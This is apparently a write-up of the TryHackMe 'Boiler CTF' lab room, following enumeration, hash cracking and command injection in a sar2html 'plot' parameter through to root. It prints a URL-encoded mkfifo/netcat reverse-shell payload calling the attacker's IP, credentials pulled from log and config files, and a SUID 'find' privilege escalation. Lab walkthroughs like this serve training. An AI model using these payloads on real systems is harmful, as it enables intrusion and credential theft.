# TryHackMe: Boiler CTF

<img src="https://tryhackme-images.s3.amazonaws.com/room-icons/4a800c6513239dbdfaf74ce869a88add.jpeg">

[Boiler CTF](https://tryhackme.com/room/boilerctf2) is an intermediate level CTF from TryHackMe.

## TOC
- [Task 1]
- [Task 2]

-----

## Task 1

### Recon

#### Browsing to host

- `http://10.10.153.189` reveals a default apache page.

- `http://10.10.153.189/robots.txt` reveals a number of directories.

- `http://10.10.153.189/sitemap.xml` doesn't exist but reveals `Apache/2.4.18 (Ubuntu) Server at 10.10.153.189 Port 80`

#### Sitemap diving

The `robots.txt` file reveal a number of directories.
```robots
User-agent: *
Disallow: /

/tmp
/.ssh
/yellow
/not
/a+rabbit
/hole
/or
/is
/it

079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075
```

- __`http://10.10.153.189/tmp`__: Not found on server
- __`http://10.10.153.189/.ssh`__: Not found..
- __`http://10.10.153.189/yellow`__: ..
- __`http://10.10.153.189/not`__: ..
- __`http://10.10.153.189/a+rabbit`__: ..
- __`http://10.10.153.189/hole`__: ..
- __`http://10.10.153.189/or`__: ..
- __`http://10.10.153.189/is`__: ..
- __`http://10.10.153.189/it`__: ..


It seems that the `robots.txt` file's disallowed directories has been setup wrong, and seems to include unrelated directories?
 
However, there is an ASCII encoded string `079 ... 075` which decodes to `OTliMDY2MGNkOTVhZGVhMzI3YzU0MTgyYmFhNTE1ODQK`.

I ran this through a base64 decoder `echo OTliMDY... | base64 -d`, which returned an MD5 hash `99b0660cd95adea327c54182baa51584`.

Following the retrieval on an MD5 hash, I ran Hydra to attempt cracking it, and cracked the hash; revealing `kidding`. Perhaps it was a rabbit hole, but we'll find out later.

```
kali@kali:~/Documents/ctf/try-hack-me/boiler-ctf$ hashcat -a 0 -m 0 99b0660cd95adea327c54182baa51584 /usr/share/wordlists/rockyou.txt 
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-4690K CPU @ 3.50GHz, 2890/2954 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

99b0660cd95adea327c54182baa51584:kidding         
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: MD5
Hash.Target......: 99b0660cd95adea327c54182baa51584
Time.Started.....: Sun Sep 20 09:49:18 2020 (0 secs)
Time.Estimated...: Sun Sep 20 09:49:18 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1059.9 kH/s (0.71ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 57344/14344385 (0.40%)
Rejected.........: 0/57344 (0.00%)
Restore.Point....: 53248/14344385 (0.37%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: soydivina -> YELLOW1

Started: Sun Sep 20 09:49:15 2020
Stopped: Sun Sep 20 09:49:20 2020
```

### Enumeration
 
#### Nmap scan

Brought back 4 interesting services; 1 on FTP with anonymous login; 2 HTTP servers on different ports; 1 SSH server.

```
kali@kali:~$ nmap -A -p- 10.10.153.189
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-20 10:11 EDT
Nmap scan report for 10.10.153.189
Host is up (0.015s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.8.219
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
|_  256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1058.44 seconds


### FTP diving

The nmap scan reveals that the FTP server allows anonymous login. Lets check it out.

```shell
kali@kali:~$ ftp 10.10.153.189

Connected to 10.10.153.189.
220 (vsFTPd 3.0.3)
Name (10.10.153.189:kali): Anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.

ftp> ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
226 Directory send OK.

ftp> get .info.txt
local: .info.txt remote: .info.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .info.txt (74 bytes).
226 Transfer complete.
74 bytes received in 0.00 secs (1.7643 MB/s)

ftp> exit
221 Goodbye.
kali@kali:~$ cat .info.txt
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
```

We find a file `.info.txt`. We contains some ciphertext that is seemingly encrypted with a casesar cipher. On decoding it reveals `Just wanted to see if you find it. Lol. Remember: Enumeration is the key!`.

### GoBuster

#### Port 80
```
kali@kali:~$ gobuster dir --url http://10.10.153.189:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.153.189:80
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/20 11:14:47 Starting gobuster
===============================================================
/manual (Status: 301)
/joomla (Status: 301)
```

Interestingly, we find the CMS `joomla` is listed as a directory on port 80. 

Lets enumerate this further.

```
kali@kali:~$ gobuster dir --url http://10.10.153.189:80/joomla -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.153.189:80/joomla
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/20 11:21:03 Starting gobuster
===============================================================
/images (Status: 301)
/media (Status: 301)
/templates (Status: 301)
/modules (Status: 301)
/tests (Status: 301)
/bin (Status: 301)
/plugins (Status: 301)
/includes (Status: 301)
/language (Status: 301)
/components (Status: 301)
/cache (Status: 301)
/libraries (Status: 301)
/installation (Status: 301)
/build (Status: 301)
/tmp (Status: 301)
/layouts (Status: 301)
/administrator (Status: 301)
/cli (Status: 301)
/_files (Status: 301)
```

## Joomla diving

From the previous [Gobuster](#gobuster) scan, there were a number of directories found in the `/joomla` directory. But I noticed a seemingly odd directory, `/_files`.

On navigation to this directory, I found `VjJodmNITnBaU0JrWVdsemVRbz0K`.

And ran `hashid` against this, which returned no hash ID. Instead I'll attempt a `base64 -d` decode as this worked on previous encrypted strings. 

```
kali@kali:~$ echo VjJodmNITnBaU0JrWVdsemVRbz0K | base64 -d | base64 -d
Whopsie daisy
```

Potentially another rabbit hole.

## _database 

Some caesar cipher rabbit hole.

## _test

After a few hours of enumerating; I eventually found `http://10.10.196.235/joomla/_test/index.php?plot=NEW`

And notably, the only changing the `plot=` get parameter on the URL would return a different text block on page. This may be vulnerable to remote code execution.

I tried injecting `<?php system('ls -lah)';?>` but the code was commented on return.

After some tinkering, I found that `plot` actually takes direct shell execution commands. And after running `http://10.10.196.235/joomla/_test/index.php?plot=;%20ls%20-lah` I found the directory listing was visible from the _Select Host_ drop down menu. Here `log.txt` and `index.php` were visible.

## [Task 2] Questions #2

Now we've got an RCE vulnerability, lets try get reverse shell.

Inititally the reverse `netcat` shell did not work, but instead, on URL encoding it _did_ fire.

```
http://10.10.196.235/joomla/_test/index.php?plot=;rm%20%2ftmp%2ff%3bmkfifo%20%2ftmp%2ff%3bcat%20%2ftmp%2ff%7c%2fbin%2fsh%20-i%202%3e%261%20%7c%20nc%2010.11.8.219%204444%20%3e%2ftmp%2ff
```

And we get shell.

```console
kali@kali:~$ nc -lvp 4444
listening on [any] 4444 ...
10.10.196.235: inverse host lookup failed: Unknown host
connect to [10.11.8.219] from (UNKNOWN) [10.10.196.235] 34372
/bin/sh: 0: can't access tty; job control turned off
$ 
```

On shell, I ran `cat` on log.txt and found credentials for `basterd`, password `superduperp@ss`

```console
$ ls
index.php
log.txt
sar2html
sarFILE
$ cat log.txt
Aug 20 11:16:26 parrot sshd[2443]: Server listening on 0.0.0.0 port 22.
Aug 20 11:16:26 parrot sshd[2443]: Server listening on :: port 22.
Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: superduperp@$$
Aug 20 11:16:35 parrot sshd[2451]: pam_unix(sshd:session): session opened for user pentest by (uid=0)
Aug 20 11:16:36 parrot sshd[2466]: Received disconnect from 10.10.170.50 port 49824:11: disconnected by user
Aug 20 11:16:36 parrot sshd[2466]: Disconnected from user pentest 10.10.170.50 port 49824
Aug 20 11:16:36 parrot sshd[2451]: pam_unix(sshd:session): session closed for user pentest
Aug 20 12:24:38 parrot sshd[2443]: Received signal 15; terminating.
```

Pull credentials from Joomla's `configuration.php`.

```php
public $dbtype = 'mysqli';
        public $host = '127.0.0.1';
        public $user = 'joomlauser';
        public $password = 'passwordz';
        public $db = 'joomladb';
        public $dbprefix = 'wyot4_';
        public $live_site = '';
        public $secret = '5O2SmJUZB24rhcfL';
        public $sendmail = '/usr/sbin/sendmail';


```

Got interactive terminal with:
```shell
$ echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py; python /tmp/asdf.py;

www-data@Vulnerable:/var/www/html/joomla$ 
```

After loitering around in the machine for a while, I chose to ssh into the machine as `basterd`, the earlier found user. Hopefully they have more permissions than `www-data`. We should remember to use the _higher port_ `55007` SSH we found in the [nmap scan](#nmap).

```console
ssh basterd@10.10.190.176 -p 55007
```

```console
kali@kali:~/Documents$ ssh basterd@10.10.190.176 -p 55007
The authenticity of host '[10.10.190.176]:55007 ([10.10.190.176]:55007)' can't be established.
ECDSA key fingerprint is SHA256:mvrEiZlb4jqadxXJccZYZkCL/DHElLVQ74eKaSKZiRk.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.190.176]:55007' (ECDSA) to the list of known hosts.
basterd@10.10.190.176's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

8 packages can be updated.
8 updates are security updates.


Last login: Thu Aug 22 12:29:45 2019 from 192.168.1.199
$ whoami
basterd
```

After `ssh`ing into the box. And running `ls -lah`, I found a shell script called `backup.sh`, which has the owner `stoner`.

```console
$ ls -lah
total 16K
drwxr-x--- 3 basterd basterd 4.0K Aug 22  2019 .
drwxr-xr-x 4 root    root    4.0K Aug 22  2019 ..
-rwxr-xr-x 1 stoner  basterd  699 Aug 21  2019 backup.sh
-rw------- 1 basterd basterd    0 Aug 22  2019 .bash_history
drwx------ 2 basterd basterd 4.0K Aug 22  2019 .cache
```

The file has a number of important parts.
- `stoner`:`superduperp@$$no1knows` are the creds for our next user.

```console
$ cat backup.sh
REMOTE=1.2.3.4

SOURCE=/home/stoner
TARGET=/usr/local/backup

LOG=/home/stoner/bck.log
 
DATE=`date +%y\.%m\.%d\.`

USER=stoner
#superduperp@$$no1knows

ssh $USER@$REMOTE mkdir $TARGET/$DATE

if [ -d "$SOURCE" ]; then
    for i in `ls $SOURCE | grep 'data'`;do
             echo "Begining copy of" $i  >> $LOG
             scp  $SOURCE/$i $USER@$REMOTE:$TARGET/$DATE
             echo $i "completed" >> $LOG

                if [ -n `ssh $USER@$REMOTE ls $TARGET/$DATE/$i 2>/dev/null` ];then
                    rm $SOURCE/$i
                    echo $i "removed" >> $LOG
                    echo "####################" >> $LOG
                                else
                                        echo "Copy not complete" >> $LOG
                                        exit 0
                fi 
    done
     

else

    echo "Directory is not present" >> $LOG
    exit 0
fi
```

Moved to `stoner` via SSH, and run `cat` on the file to find:
```console
$ cat .secret
You made it till here, well done.
```

From here, I checked what we can run as `root` by running `sudo -l`.

```console
stoner@Vulnerable:/$ sudo -l
User stoner may run the following commands on Vulnerable:
    (root) NOPASSWD: /NotThisTime/MessinWithYa
```

I also checked `stoner`'s `groups`.

```console
stoner@Vulnerable:/$ groups
stoner adm cdrom dip plugdev lxd lpadmin sambashare
```

At this point, sought out some files with SUID. 

```shell
stoner@Vulnerable:/usr/bin$ find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null

-rwsr-xr-x 1 root root 38900 Mar 26  2019 /bin/su
-rwsr-xr-x 1 root root 30112 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 26492 May 15  2019 /bin/umount
-rwsr-xr-x 1 root root 34812 May 15  2019 /bin/mount
-rwsr-xr-x 1 root root 43316 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 38932 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 13960 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-- 1 root www-data 13692 Apr  3  2019 /usr/lib/apache2/suexec-custom
-rwsr-xr-- 1 root www-data 13692 Apr  3  2019 /usr/lib/apache2/suexec-pristine
-rwsr-xr-- 1 root messagebus 46436 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 513528 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 5480 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 36288 Mar 26  2019 /usr/bin/newgidmap
-r-sr-xr-x 1 root root 232196 Feb  8  2016 /usr/bin/find
-rwsr-sr-x 1 daemon daemon 50748 Jan 15  2016 /usr/bin/at
-rwsr-xr-x 1 root root 39560 Mar 26  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 74280 Mar 26  2019 /usr/bin/chfn
-rwsr-xr-x 1 root root 53128 Mar 26  2019 /usr/bin/passwd
-rwsr-xr-x 1 root root 34680 Mar 26  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root root 159852 Jun 11  2019 /usr/bin/sudo
-rwsr-xr-x 1 root root 18216 Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 78012 Mar 26  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 36288 Mar 26  2019 /usr/bin/newuidmap
```

And finally, granted `stoner` access to `/root` in order to read `root.txt` flag.

```shell
stoner@Vulnerable:/usr/bin$ find . -exec chown stoner /root \;
stoner@Vulnerable:/usr/bin$ ls /root
root.txt
stoner@Vulnerable:/usr/bin$ cat /root/root.txt
```

